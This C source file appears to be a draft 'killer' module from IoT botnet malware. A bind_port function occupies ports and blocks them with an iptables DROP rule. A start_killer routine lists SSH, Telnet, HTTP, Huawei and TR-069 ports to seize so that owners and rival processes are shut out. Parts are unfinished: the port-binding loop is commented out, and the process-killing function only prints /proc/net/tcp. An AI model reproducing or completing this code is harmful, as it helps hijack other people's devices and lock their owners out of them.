#define _GNU_SOURCE

#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "../utils/util.h"
#include "security.h"

/**
 * @brief Bind a socket to a port to avoid another process to use it
 *
 * @param port Port to bind
 * @param drop Drop the port using iptables
 * @return int (BOOL)
 */
int bind_port(int port, int drop)
{
    int sock, client;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    bind(sock, (struct sockaddr *)&server, sizeof(server));

    if (listen(sock, 0) != SUCCESS)
        return FALSE;

    if (drop == TRUE)
    {
        char *cmd = malloc(256);
        snprintf(cmd, 256, "iptables -A INPUT -p tcp -s 0/0 -d 0/0 --dport %d -j DROP", port);

#ifndef DEBUG
        system(cmd);
#endif

        free(cmd);
    }

    return TRUE;
}

/**
 * @brief Find process using a specific port and terminate it
 *
 * @param port Port to check
 */
void kill_by_port(int port)
{
    char **lines = read_file("/proc/net/tcp");

    for (int i = 0; lines[i] != NULL; i++)
    {
        printf("%s\n", lines[i]);
    }
}

/**
 * @brief Start killer loop
 *
 * @return void*
 */
void *start_killer()
{
    int port_to_close[] = {
        22,          // SSH
        25,          // SMTP
        80,          // HTTP
        443,         // HTTPs
        50023,       // Huawei
        23, 2323,    // TELNET
        8080, 3126,  // Proxy etc.
        7547, 35000, // Tr-069
    };

    while (TRUE)
    {
        // Bind all critical ports
        /*
        for (int i = 0; i < sizeof(port_to_close) / sizeof(int); i++)
            if (bind_port(port_to_close[i], TRUE) == TRUE)
                debug("[KILLER] Bind port.", FALSE);
        */

        // Kill all proccesses who use internet
        for (int i = 50020; i < 50023; i++)
            kill_by_port(i);

        break;
        sleep(KILLER_WAIT_TIME);
    }
}
